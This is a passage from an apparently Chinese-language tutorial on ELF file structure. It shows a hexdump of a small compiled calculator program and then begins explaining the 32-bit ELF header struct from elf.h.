6e  |ber that you wan|</span><br><span class="line">00002040  74 20 74 6f 20 61 64 64  3a 00 25 64 25 64 00 59  |t to add:.%d%d.Y|</span><br><span class="line">00002050  6f 75 72 20 69 6e 70 75  74 20 69 73 3a 25 64 20  |our input is:%d |</span><br><span class="line">00002060  61 6e 64 20 25 64 0a 00  43 61 6c 63 75 6c 61 74  |and %d..Calculat|</span><br><span class="line">00002070  65 72 20 69 73 20 45 4e  44 2e 00 00 01 1b 03 3b  |er is END......;|</span><br><span class="line">00002080  50 00 00 00 09 00 00 00  a4 ef ff ff 98 00 00 00  |P...............|</span><br><span class="line">00002090  e4 ef ff ff bc 00 00 00  f4 ef ff ff 6c 00 00 00  |............l...|</span><br><span class="line">000020a0  2d f1 ff ff d0 00 00 00  66 f1 ff ff f4 00 00 00  |-.......f.......|</span><br><span class="line">000020b0  fd f1 ff ff 28 01 00 00  04 f2 ff ff 3c 01 00 00  |....(.......&lt;...|</span><br><span class="line">000020c0  64 f2 ff ff 88 01 00 00  65 f2 ff ff 9c 01 00 00  |d.......e.......|</span><br><span class="line">000020d0  14 00 00 00 00 00 00 00  01 7a 52 00 01 7c 08 01  |.........zR..|..|</span><br><span class="line">000020e0  1b 0c 04 04 88 01 07 08  10 00 00 00 1c 00 00 00  |................|</span><br><span class="line">000020f0  80 ef ff ff 36 00 00 00  00 00 00 00 14 00 00 00  |....6...........|</span><br><span class="line">00002100  00 00 00 00 01 7a 52 00  01 7c 08 01 1b 0c 04 04  |.....zR..|......|</span><br><span class="line">00002110  88 01 00 00 20 00 00 00  1c 00 00 00 04 ef ff ff  |.... ...........|</span><br><span class="line">00002120  40 00 00 00 00 0e 08 46  0e 0c 4a 0f 0b 74 04 78  |@......F..J..t.x|</span><br><span class="line">00002130  00 3f 1a 3b 2a 32 24 22  10 00 00 00 40 00 00 00  |.?.;*2$&quot;....@...|</span><br><span class="line">00002140  20 ef ff ff 08 00 00 00  00 00 00 00 20 00 00 00  | ........... ...|</span><br><span class="line">00002150  54 00 00 00 55 f0 ff ff  39 00 00 00 00 41 0e 08  |T...U...9....A..|</span><br><span class="line">00002160  85 02 42 0d 05 44 83 03  71 c5 c3 0c 04 04 00 00  |..B..D..q.......|</span><br><span class="line">00002170  30 00 00 00 78 00 00 00  6a f0 ff ff 97 00 00 00  |0...x...j.......|</span><br><span class="line">00002180  00 44 0c 01 00 47 10 05  02 75 00 44 0f 03 75 78  |.D...G...u.D..ux|</span><br><span class="line">00002190  06 10 03 02 75 7c 02 82  c1 0c 01 00 41 c3 41 c5  |....u|......A.A.|</span><br><span class="line">000021a0  43 0c 04 04 10 00 00 00  ac 00 00 00 cd f0 ff ff  |C...............|</span><br><span class="line">000021b0  04 00 00 00 00 00 00 00  48 00 00 00 c0 00 00 00  |........H.......|</span><br><span class="line">000021c0  c0 f0 ff ff 5d 00 00 00  00 41 0e 08 85 02 4c 0e  |....]....A....L.|</span><br><span class="line">000021d0  0c 87 03 41 0e 10 86 04  41 0e 14 83 05 43 0e 20  |...A....A....C. |</span><br><span class="line">000021e0  69 0e 24 41 0e 28 44 0e  2c 44 0e 30 4d 0e 20 47  |i.$A.(D.,D.0M. G|</span><br><span class="line">000021f0  0e 14 41 c3 0e 10 41 c6  0e 0c 41 c7 0e 08 41 c5  |..A...A...A...A.|</span><br><span class="line">00002200  0e 04 00 00 10 00 00 00  0c 01 00 00 d4 f0 ff ff  |................|</span><br><span class="line">00002210  01 00 00 00 00 00 00 00  10 00 00 00 20 01 00 00  |............ ...|</span><br><span class="line">00002220  c1 f0 ff ff 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002230  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ef0  00 00 00 00 a0 11 00 00  50 11 00 00 01 00 00 00  |........P.......|</span><br><span class="line">00002f00  47 00 00 00 0c 00 00 00  00 10 00 00 0d 00 00 00  |G...............|</span><br><span class="line">00002f10  e8 12 00 00 19 00 00 00  f4 3e 00 00 1b 00 00 00  |.........&gt;......|</span><br><span class="line">00002f20  04 00 00 00 1a 00 00 00  f8 3e 00 00 1c 00 00 00  |.........&gt;......|</span><br><span class="line">00002f30  04 00 00 00 f5 fe ff 6f  ec 01 00 00 05 00 00 00  |.......o........|</span><br><span class="line">00002f40  9c 02 00 00 06 00 00 00  0c 02 00 00 0a 00 00 00  |................|</span><br><span class="line">00002f50  b6 00 00 00 0b 00 00 00  10 00 00 00 15 00 00 00  |................|</span><br><span class="line">00002f60  00 00 00 00 03 00 00 00  00 40 00 00 02 00 00 00  |.........@......|</span><br><span class="line">00002f70  18 00 00 00 14 00 00 00  11 00 00 00 17 00 00 00  |................|</span><br><span class="line">00002f80  e4 03 00 00 11 00 00 00  a4 03 00 00 12 00 00 00  |................|</span><br><span class="line">00002f90  40 00 00 00 13 00 00 00  08 00 00 00 fb ff ff 6f  |@..............o|</span><br><span class="line">00002fa0  00 00 00 08 fe ff ff 6f  64 03 00 00 ff ff ff 6f  |.......od......o|</span><br><span class="line">00002fb0  01 00 00 00 f0 ff ff 6f  52 03 00 00 fa ff ff 6f  |.......oR......o|</span><br><span class="line">00002fc0  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002fd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ff0  00 00 00 00 00 00 00 00  e2 11 00 00 00 00 00 00  |................|</span><br><span class="line">00003000  fc 3e 00 00 00 00 00 00  00 00 00 00 36 10 00 00  |.&gt;..........6...|</span><br><span class="line">00003010  46 10 00 00 56 10 00 00  00 00 00 00 1c 40 00 00  |F...V........@..|</span><br><span class="line">00003020  47 43 43 3a 20 28 44 65  62 69 61 6e 20 31 30 2e  |GCC: (Debian 10.|</span><br><span class="line">00003030  32 2e 30 2d 35 29 20 31  30 2e 32 2e 30 00 00 00  |2.0-5) 10.2.0...|</span><br><span class="line">00003040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003050  00 00 00 00 94 01 00 00  00 00 00 00 03 00 01 00  |................|</span><br><span class="line">00003060  00 00 00 00 a8 01 00 00  00 00 00 00 03 00 02 00  |................|</span><br><span class="line">00003070  00 00 00 00 cc 01 00 00  00 00 00 00 03 00 03 00  |................|</span><br><span class="line">00003080  00 00 00 00 ec 01 00 00  00 00 00 00 03 00 04 00  |................|</span><br><span class="line">00003090  00 00 00 00 0c 02 00 00  00 00 00 00 03 00 05 00  |................|</span><br><span class="line">000030a0  00 00 00 00 9c 02 00 00  00 00 00 00 03 00 06 00  |................|</span><br><span class="line">000030b0  00 00 00 00 52 03 00 00  00 00 00 00 03 00 07 00  |....R...........|</span><br><span class="line">000030c0  00 00 00 00 64 03 00 00  00 00 00 00 03 00 08 00  |....d...........|</span><br><span class="line">000030d0  00 00 00 00 a4 03 00 00  00 00 00 00 03 00 09 00  |................|</span><br><span class="line">000030e0  00 00 00 00 e4 03 00 00  00 00 00 00 03 00 0a 00  |................|</span><br><span class="line">000030f0  00 00 00 00 00 10 00 00  00 00 00 00 03 00 0b 00  |................|</span><br><span class="line">00003100  00 00 00 00 20 10 00 00  00 00 00 00 03 00 0c 00  |.... ...........|</span><br><span class="line">00003110  00 00 00 00 60 10 00 00  00 00 00 00 03 00 0d 00  |....`...........|</span><br><span class="line">00003120  00 00 00 00 70 10 00 00  00 00 00 00 03 00 0e 00  |....p...........|</span><br><span class="line">00003130  00 00 00 00 e8 12 00 00  00 00 00 00 03 00 0f 00  |................|</span><br><span class="line">00003140  00 00 00 00 00 20 00 00  00 00 00 00 03 00 10 00  |..... ..........|</span><br><span class="line">00003150  00 00 00 00 7c 20 00 00  00 00 00 00 03 00 11 00  |....| ..........|</span><br><span class="line">00003160  00 00 00 00 d0 20 00 00  00 00 00 00 03 00 12 00  |..... ..........|</span><br><span class="line">00003170  00 00 00 00 f4 3e 00 00  00 00 00 00 03 00 13 00  |.....&gt;..........|</span><br><span class="line">00003180  00 00 00 00 f8 3e 00 00  00 00 00 00 03 00 14 00  |.....&gt;..........|</span><br><span class="line">00003190  00 00 00 00 fc 3e 00 00  00 00 00 00 03 00 15 00  |.....&gt;..........|</span><br><span class="line">000031a0  00 00 00 00 ec 3f 00 00  00 00 00 00 03 00 16 00  |.....?..........|</span><br><span class="line">000031b0  00 00 00 00 00 40 00 00  00 00 00 00 03 00 17 00  |.....@..........|</span><br><span class="line">000031c0  00 00 00 00 18 40 00 00  00 00 00 00 03 00 18 00  |.....@..........|</span><br><span class="line">000031d0  00 00 00 00 20 40 00 00  00 00 00 00 03 00 19 00  |.... @..........|</span><br><span class="line">000031e0  00 00 00 00 00 00 00 00  00 00 00 00 03 00 1a 00  |................|</span><br><span class="line">000031f0  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003200  0c 00 00 00 c0 10 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003210  0e 00 00 00 00 11 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003220  21 00 00 00 50 11 00 00  00 00 00 00 02 00 0e 00  |!...P...........|</span><br><span class="line">00003230  37 00 00 00 20 40 00 00  01 00 00 00 01 00 19 00  |7... @..........|</span><br><span class="line">00003240  43 00 00 00 f8 3e 00 00  00 00 00 00 01 00 14 00  |C....&gt;..........|</span><br><span class="line">00003250  6a 00 00 00 a0 11 00 00  00 00 00 00 02 00 0e 00  |j...............|</span><br><span class="line">00003260  76 00 00 00 f4 3e 00 00  00 00 00 00 01 00 13 00  |v....&gt;..........|</span><br><span class="line">00003270  95 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003280  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003290  9c 00 00 00 2c 22 00 00  00 00 00 00 01 00 12 00  |....,&quot;..........|</span><br><span class="line">000032a0  00 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">000032b0  aa 00 00 00 f8 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032c0  bb 00 00 00 fc 3e 00 00  00 00 00 00 01 00 15 00  |.....&gt;..........|</span><br><span class="line">000032d0  c4 00 00 00 f4 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032e0  d7 00 00 00 7c 20 00 00  00 00 00 00 00 00 11 00  |....| ..........|</span><br><span class="line">000032f0  ea 00 00 00 00 40 00 00  00 00 00 00 01 00 17 00  |.....@..........|</span><br><span class="line">00003300  06 02 00 00 00 10 00 00  00 00 00 00 02 00 0b 00  |................|</span><br><span class="line">00003310  00 01 00 00 e0 12 00 00  01 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003320  10 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003330  2c 01 00 00 b0 10 00 00  04 00 00 00 12 02 0e 00  |,...............|</span><br><span class="line">00003340  a9 01 00 00 18 40 00 00  00 00 00 00 20 00 18 00  |.....@...... ...|</span><br><span class="line">00003350  42 01 00 00 a9 11 00 00  39 00 00 00 12 00 0e 00  |B.......9.......|</span><br><span class="line">00003360  46 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |F...............|</span><br><span class="line">00003370  58 01 00 00 e1 12 00 00  00 00 00 00 12 02 0e 00  |X...............|</span><br><span class="line">00003380  6e 01 00 00 20 40 00 00  00 00 00 00 10 00 18 00  |n... @..........|</span><br><span class="line">00003390  0a 01 00 00 e8 12 00 00  00 00 00 00 12 02 0f 00  |................|</span><br><span class="line">000033a0  75 01 00 00 a5 11 00 00  00 00 00 00 12 02 0e 00  |u...............|</span><br><span class="line">000033b0  8b 01 00 00 00 00 00 00  00 00 00 00 22 00 00 00  |............&quot;...|</span><br><span class="line">000033c0  a7 01 00 00 18 40 00 00  00 00 00 00 10 00 18 00  |.....@..........|</span><br><span class="line">000033d0  b4 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000033e0  c3 01 00 00 1c 40 00 00  00 00 00 00 11 02 18 00  |.....@..........|</span><br><span class="line">000033f0  d0 01 00 00 04 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003400  df 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |................|</span><br><span class="line">00003410  fc 01 00 00 80 12 00 00  5d 00 00 00 12 00 0e 00  |........].......|</span><br><span class="line">00003420  b6 00 00 00 24 40 00 00  00 00 00 00 10 00 19 00  |....$@..........|</span><br><span class="line">00003430  ad 01 00 00 70 10 00 00  36 00 00 00 12 00 0e 00  |....p...6.......|</span><br><span class="line">00003440  0c 02 00 00 00 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003450  13 02 00 00 20 40 00 00  00 00 00 00 10 00 19 00  |.... @..........|</span><br><span class="line">00003460  1f 02 00 00 e2 11 00 00  97 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003470  24 02 00 00 79 12 00 00  00 00 00 00 12 02 0e 00  |$...y...........|</span><br><span class="line">00003480  3a 02 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |:...............|</span><br><span class="line">00003490  54 02 00 00 20 40 00 00  00 00 00 00 11 02 18 00  |T... @..........|</span><br><span class="line">000034a0  60 02 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |`........... ...|</span><br><span class="line">000034b0  00 63 72 74 73 74 75 66  66 2e 63 00 64 65 72 65  |.crtstuff.c.dere|</span><br><span class="line">000034c0  67 69 73 74 65 72 5f 74  6d 5f 63 6c 6f 6e 65 73  |gister_tm_clones|</span><br><span class="line">000034d0  00 5f 5f 64 6f 5f 67 6c  6f 62 61 6c 5f 64 74 6f  |.__do_global_dto|</span><br><span class="line">000034e0  72 73 5f 61 75 78 00 63  6f 6d 70 6c 65 74 65 64  |rs_aux.completed|</span><br><span class="line">000034f0  2e 30 00 5f 5f 64 6f 5f  67 6c 6f 62 61 6c 5f 64  |.0.__do_global_d|</span><br><span class="line">00003500  74 6f 72 73 5f 61 75 78  5f 66 69 6e 69 5f 61 72  |tors_aux_fini_ar|</span><br><span class="line">00003510  72 61 79 5f 65 6e 74 72  79 00 66 72 61 6d 65 5f  |ray_entry.frame_|</span><br><span class="line">00003520  64 75 6d 6d 79 00 5f 5f  66 72 61 6d 65 5f 64 75  |dummy.__frame_du|</span><br><span class="line">00003530  6d 6d 79 5f 69 6e 69 74  5f 61 72 72 61 79 5f 65  |mmy_init_array_e|</span><br><span class="line">00003540  6e 74 72 79 00 74 65 73  74 2e 63 00 5f 5f 46 52  |ntry.test.c.__FR|</span><br><span class="line">00003550  41 4d 45 5f 45 4e 44 5f  5f 00 5f 5f 69 6e 69 74  |AME_END__.__init|</span><br><span class="line">00003560  5f 61 72 72 61 79 5f 65  6e 64 00 5f 44 59 4e 41  |_array_end._DYNA|</span><br><span class="line">00003570  4d 49 43 00 5f 5f 69 6e  69 74 5f 61 72 72 61 79  |MIC.__init_array|</span><br><span class="line">00003580  5f 73 74 61 72 74 00 5f  5f 47 4e 55 5f 45 48 5f  |_start.__GNU_EH_|</span><br><span class="line">00003590  46 52 41 4d 45 5f 48 44  52 00 5f 47 4c 4f 42 41  |FRAME_HDR._GLOBA|</span><br><span class="line">000035a0  4c 5f 4f 46 46 53 45 54  5f 54 41 42 4c 45 5f 00  |L_OFFSET_TABLE_.|</span><br><span class="line">000035b0  5f 5f 6c 69 62 63 5f 63  73 75 5f 66 69 6e 69 00  |__libc_csu_fini.|</span><br><span class="line">000035c0  5f 49 54 4d 5f 64 65 72  65 67 69 73 74 65 72 54  |_ITM_deregisterT|</span><br><span class="line">000035d0  4d 43 6c 6f 6e 65 54 61  62 6c 65 00 5f 5f 78 38  |MCloneTable.__x8|</span><br><span class="line">000035e0  36 2e 67 65 74 5f 70 63  5f 74 68 75 6e 6b 2e 62  |6.get_pc_thunk.b|</span><br><span class="line">000035f0  78 00 61 64 64 00 70 72  69 6e 74 66 40 40 47 4c  |x.add.printf@@GL|</span><br><span class="line">00003600  49 42 43 5f 32 2e 30 00  5f 5f 78 38 36 2e 67 65  |IBC_2.0.__x86.ge|</span><br><span class="line">00003610  74 5f 70 63 5f 74 68 75  6e 6b 2e 62 70 00 5f 65  |t_pc_thunk.bp._e|</span><br><span class="line">00003620  64 61 74 61 00 5f 5f 78  38 36 2e 67 65 74 5f 70  |data.__x86.get_p|</span><br><span class="line">00003630  63 5f 74 68 75 6e 6b 2e  64 78 00 5f 5f 63 78 61  |c_thunk.dx.__cxa|</span><br><span class="line">00003640  5f 66 69 6e 61 6c 69 7a  65 40 40 47 4c 49 42 43  |_finalize@@GLIBC|</span><br><span class="line">00003650  5f 32 2e 31 2e 33 00 5f  5f 64 61 74 61 5f 73 74  |_2.1.3.__data_st|</span><br><span class="line">00003660  61 72 74 00 5f 5f 67 6d  6f 6e 5f 73 74 61 72 74  |art.__gmon_start|</span><br><span class="line">00003670  5f 5f 00 5f 5f 64 73 6f  5f 68 61 6e 64 6c 65 00  |__.__dso_handle.|</span><br><span class="line">00003680  5f 49 4f 5f 73 74 64 69  6e 5f 75 73 65 64 00 5f  |_IO_stdin_used._|</span><br><span class="line">00003690  5f 6c 69 62 63 5f 73 74  61 72 74 5f 6d 61 69 6e  |_libc_start_main|</span><br><span class="line">000036a0  40 40 47 4c 49 42 43 5f  32 2e 30 00 5f 5f 6c 69  |@@GLIBC_2.0.__li|</span><br><span class="line">000036b0  62 63 5f 63 73 75 5f 69  6e 69 74 00 5f 66 70 5f  |bc_csu_init._fp_|</span><br><span class="line">000036c0  68 77 00 5f 5f 62 73 73  5f 73 74 61 72 74 00 6d  |hw.__bss_start.m|</span><br><span class="line">000036d0  61 69 6e 00 5f 5f 78 38  36 2e 67 65 74 5f 70 63  |ain.__x86.get_pc|</span><br><span class="line">000036e0  5f 74 68 75 6e 6b 2e 61  78 00 5f 5f 69 73 6f 63  |_thunk.ax.__isoc|</span><br><span class="line">000036f0  39 39 5f 73 63 61 6e 66  40 40 47 4c 49 42 43 5f  |99_scanf@@GLIBC_|</span><br><span class="line">00003700  32 2e 37 00 5f 5f 54 4d  43 5f 45 4e 44 5f 5f 00  |2.7.__TMC_END__.|</span><br><span class="line">00003710  5f 49 54 4d 5f 72 65 67  69 73 74 65 72 54 4d 43  |_ITM_registerTMC|</span><br><span class="line">00003720  6c 6f 6e 65 54 61 62 6c  65 00 00 2e 73 79 6d 74  |loneTable...symt|</span><br><span class="line">00003730  61 62 00 2e 73 74 72 74  61 62 00 2e 73 68 73 74  |ab..strtab..shst|</span><br><span class="line">00003740  72 74 61 62 00 2e 69 6e  74 65 72 70 00 2e 6e 6f  |rtab..interp..no|</span><br><span class="line">00003750  74 65 2e 67 6e 75 2e 62  75 69 6c 64 2d 69 64 00  |te.gnu.build-id.|</span><br><span class="line">00003760  2e 6e 6f 74 65 2e 41 42  49 2d 74 61 67 00 2e 67  |.note.ABI-tag..g|</span><br><span class="line">00003770  6e 75 2e 68 61 73 68 00  2e 64 79 6e 73 79 6d 00  |nu.hash..dynsym.|</span><br><span class="line">00003780  2e 64 79 6e 73 74 72 00  2e 67 6e 75 2e 76 65 72  |.dynstr..gnu.ver|</span><br><span class="line">00003790  73 69 6f 6e 00 2e 67 6e  75 2e 76 65 72 73 69 6f  |sion..gnu.versio|</span><br><span class="line">000037a0  6e 5f 72 00 2e 72 65 6c  2e 64 79 6e 00 2e 72 65  |n_r..rel.dyn..re|</span><br><span class="line">000037b0  6c 2e 70 6c 74 00 2e 69  6e 69 74 00 2e 70 6c 74  |l.plt..init..plt|</span><br><span class="line">000037c0  2e 67 6f 74 00 2e 74 65  78 74 00 2e 66 69 6e 69  |.got..text..fini|</span><br><span class="line">000037d0  00 2e 72 6f 64 61 74 61  00 2e 65 68 5f 66 72 61  |..rodata..eh_fra|</span><br><span class="line">000037e0  6d 65 5f 68 64 72 00 2e  65 68 5f 66 72 61 6d 65  |me_hdr..eh_frame|</span><br><span class="line">000037f0  00 2e 69 6e 69 74 5f 61  72 72 61 79 00 2e 66 69  |..init_array..fi|</span><br><span class="line">00003800  6e 69 5f 61 72 72 61 79  00 2e 64 79 6e 61 6d 69  |ni_array..dynami|</span><br><span class="line">00003810  63 00 2e 67 6f 74 2e 70  6c 74 00 2e 64 61 74 61  |c..got.plt..data|</span><br><span class="line">00003820  00 2e 62 73 73 00 2e 63  6f 6d 6d 65 6e 74 00 00  |..bss..comment..|</span><br><span class="line">00003830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00003850  00 00 00 00 00 00 00 00  1b 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003860  02 00 00 00 94 01 00 00  94 01 00 00 13 00 00 00  |................|</span><br><span class="line">00003870  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003880  23 00 00 00 07 00 00 00  02 00 00 00 a8 01 00 00  |#...............|</span><br><span class="line">00003890  a8 01 00 00 24 00 00 00  00 00 00 00 00 00 00 00  |....$...........|</span><br><span class="line">000038a0  04 00 00 00 00 00 00 00  36 00 00 00 07 00 00 00  |........6.......|</span><br><span class="line">000038b0  02 00 00 00 cc 01 00 00  cc 01 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000038c0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">000038d0  44 00 00 00 f6 ff ff 6f  02 00 00 00 ec 01 00 00  |D......o........|</span><br><span class="line">000038e0  ec 01 00 00 20 00 00 00  05 00 00 00 00 00 00 00  |.... ...........|</span><br><span class="line">000038f0  04 00 00 00 04 00 00 00  4e 00 00 00 0b 00 00 00  |........N.......|</span><br><span class="line">00003900  02 00 00 00 0c 02 00 00  0c 02 00 00 90 00 00 00  |................|</span><br><span class="line">00003910  06 00 00 00 01 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00003920  56 00 00 00 03 00 00 00  02 00 00 00 9c 02 00 00  |V...............|</span><br><span class="line">00003930  9c 02 00 00 b6 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003940  01 00 00 00 00 00 00 00  5e 00 00 00 ff ff ff 6f  |........^......o|</span><br><span class="line">00003950  02 00 00 00 52 03 00 00  52 03 00 00 12 00 00 00  |....R...R.......|</span><br><span class="line">00003960  05 00 00 00 00 00 00 00  02 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003970  6b 00 00 00 fe ff ff 6f  02 00 00 00 64 03 00 00  |k......o....d...|</span><br><span class="line">00003980  64 03 00 00 40 00 00 00  06 00 00 00 01 00 00 00  |d...@...........|</span><br><span class="line">00003990  04 00 00 00 00 00 00 00  7a 00 00 00 09 00 00 00  |........z.......|</span><br><span class="line">000039a0  02 00 00 00 a4 03 00 00  a4 03 00 00 40 00 00 00  |............@...|</span><br><span class="line">000039b0  05 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000039c0  83 00 00 00 09 00 00 00  42 00 00 00 e4 03 00 00  |........B.......|</span><br><span class="line">000039d0  e4 03 00 00 18 00 00 00  05 00 00 00 17 00 00 00  |................|</span><br><span class="line">000039e0  04 00 00 00 08 00 00 00  8c 00 00 00 01 00 00 00  |................|</span><br><span class="line">000039f0  06 00 00 00 00 10 00 00  00 10 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003a00  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003a10  87 00 00 00 01 00 00 00  06 00 00 00 20 10 00 00  |............ ...|</span><br><span class="line">00003a20  20 10 00 00 40 00 00 00  00 00 00 00 00 00 00 00  | ...@...........|</span><br><span class="line">00003a30  10 00 00 00 04 00 00 00  92 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a40  06 00 00 00 60 10 00 00  60 10 00 00 08 00 00 00  |....`...`.......|</span><br><span class="line">00003a50  00 00 00 00 00 00 00 00  08 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003a60  9b 00 00 00 01 00 00 00  06 00 00 00 70 10 00 00  |............p...|</span><br><span class="line">00003a70  70 10 00 00 75 02 00 00  00 00 00 00 00 00 00 00  |p...u...........|</span><br><span class="line">00003a80  10 00 00 00 00 00 00 00  a1 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a90  06 00 00 00 e8 12 00 00  e8 12 00 00 14 00 00 00  |................|</span><br><span class="line">00003aa0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ab0  a7 00 00 00 01 00 00 00  02 00 00 00 00 20 00 00  |............. ..|</span><br><span class="line">00003ac0  00 20 00 00 7b 00 00 00  00 00 00 00 00 00 00 00  |. ..&#123;...........|</span><br><span class="line">00003ad0  04 00 00 00 00 00 00 00  af 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003ae0  02 00 00 00 7c 20 00 00  7c 20 00 00 54 00 00 00  |....| ..| ..T...|</span><br><span class="line">00003af0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b00  bd 00 00 00 01 00 00 00  02 00 00 00 d0 20 00 00  |............. ..|</span><br><span class="line">00003b10  d0 20 00 00 60 01 00 00  00 00 00 00 00 00 00 00  |. ..`...........|</span><br><span class="line">00003b20  04 00 00 00 00 00 00 00  c7 00 00 00 0e 00 00 00  |................|</span><br><span class="line">00003b30  03 00 00 00 f4 3e 00 00  f4 2e 00 00 04 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b40  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003b50  d3 00 00 00 0f 00 00 00  03 00 00 00 f8 3e 00 00  |.............&gt;..|</span><br><span class="line">00003b60  f8 2e 00 00 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b70  04 00 00 00 04 00 00 00  df 00 00 00 06 00 00 00  |................|</span><br><span class="line">00003b80  03 00 00 00 fc 3e 00 00  fc 2e 00 00 f0 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b90  06 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003ba0  96 00 00 00 01 00 00 00  03 00 00 00 ec 3f 00 00  |.............?..|</span><br><span class="line">00003bb0  ec 2f 00 00 14 00 00 00  00 00 00 00 00 00 00 00  |./..............|</span><br><span class="line">00003bc0  04 00 00 00 04 00 00 00  e8 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003bd0  03 00 00 00 00 40 00 00  00 30 00 00 18 00 00 00  |.....@...0......|</span><br><span class="line">00003be0  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003bf0  f1 00 00 00 01 00 00 00  03 00 00 00 18 40 00 00  |.............@..|</span><br><span class="line">00003c00  18 30 00 00 08 00 00 00  00 00 00 00 00 00 00 00  |.0..............|</span><br><span class="line">00003c10  04 00 00 00 00 00 00 00  f7 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003c20  03 00 00 00 20 40 00 00  20 30 00 00 04 00 00 00  |.... @.. 0......|</span><br><span class="line">00003c30  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003c40  fc 00 00 00 01 00 00 00  30 00 00 00 00 00 00 00  |........0.......|</span><br><span class="line">00003c50  20 30 00 00 1e 00 00 00  00 00 00 00 00 00 00 00  | 0..............|</span><br><span class="line">00003c60  01 00 00 00 01 00 00 00  01 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003c70  00 00 00 00 00 00 00 00  40 30 00 00 70 04 00 00  |........@0..p...|</span><br><span class="line">00003c80  1c 00 00 00 2d 00 00 00  04 00 00 00 10 00 00 00  |....-...........|</span><br><span class="line">00003c90  09 00 00 00 03 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ca0  b0 34 00 00 7a 02 00 00  00 00 00 00 00 00 00 00  |.4..z...........|</span><br><span class="line">00003cb0  01 00 00 00 00 00 00 00  11 00 00 00 03 00 00 00  |................|</span><br><span class="line">00003cc0  00 00 00 00 00 00 00 00  2a 37 00 00 05 01 00 00  |........*7......|</span><br><span class="line">00003cd0  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ce0</span><br></pre></td></tr></table></figure><h2 id="0x02-ELF文件的结构"><a href="#0x02-ELF文件的结构" class="headerlink" title="0x02.ELF文件的结构"></a><font color="navy">0x02.ELF文件的结构</font></h2><h3 id="1-ELF的头部（52个字节）"><a href="#1-ELF的头部（52个字节）" class="headerlink" title="1.ELF的头部（52个字节）"></a>1.ELF的头部（52个字节）</h3><p>首先来看elf.h文件中ELF头部的结构体 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];     <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half    e_type;                 <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half    e_machine;              <span 